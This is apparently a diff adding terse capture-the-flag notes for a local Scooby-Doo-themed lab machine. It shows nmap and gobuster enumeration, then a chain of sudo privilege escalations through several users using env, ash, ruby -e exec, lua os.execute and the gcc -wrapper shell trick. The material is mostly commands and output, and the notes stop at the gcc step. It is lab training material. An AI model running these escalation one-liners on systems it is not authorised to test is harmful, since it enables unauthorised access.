@@ -1,0 +1,79 @@
+ sudo nmap -p- -open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+
+/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
+/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
+/Template             (Status: 403) [Size: 275]
+/Repository           (Status: 403) [Size: 275]
+/Tag                  (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+
+❯ gobuster dir -u http://172.17.0.2/themes -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 32 -x php,html,txt,zip
+
+/uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
+/upload.php           (Status: 200) [Size: 0]
+/archivo.html         (Status: 200) [Size: 3380]
+
+-------------------------------------
+www-data@b698d1af25de:/$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on b698d1af25de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on b698d1af25de:
+    (daphne) NOPASSWD: /usr/bin/env
+---------------------------------------
+
+sudo -u daphne /usr/bin/env /bin/bash
+id
+uid=1000(daphne) gid=1000(daphne) groups=1000(daphne)
+------------------------------------------
+sudo -l
+Matching Defaults entries for daphne on b698d1af25de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User daphne may run the following commands on b698d1af25de:
+    (vilma) NOPASSWD: /usr/bin/ash
+sudo -u vilma /usr/bin/ash
+id
+uid=1001(vilma) gid=1001(vilma) groups=1001(vilma)
+--------------------------------------------------------
+sudo -l
+Matching Defaults entries for vilma on b698d1af25de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User vilma may run the following commands on b698d1af25de:
+    (shaggy) NOPASSWD: /usr/bin/ruby
+sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
+id
+uid=1002(shaggy) gid=1002(shaggy) groups=1002(shaggy)
+---------------------------------------------------
+
+sudo -l
+Matching Defaults entries for shaggy on b698d1af25de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User shaggy may run the following commands on b698d1af25de:
+    (fred) NOPASSWD: /usr/bin/lua
+
+---------------------------------------------------
+sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'
+id
+uid=1003(fred) gid=1003(fred) groups=1003(fred)
+--------------------------------------------
+sudo -l
+Matching Defaults entries for fred on b698d1af25de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User fred may run the following commands on b698d1af25de:
+    (scooby) NOPASSWD: /usr/bin/gcc
+-------------------------------------------
+sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s -x c /dev/null
+
+
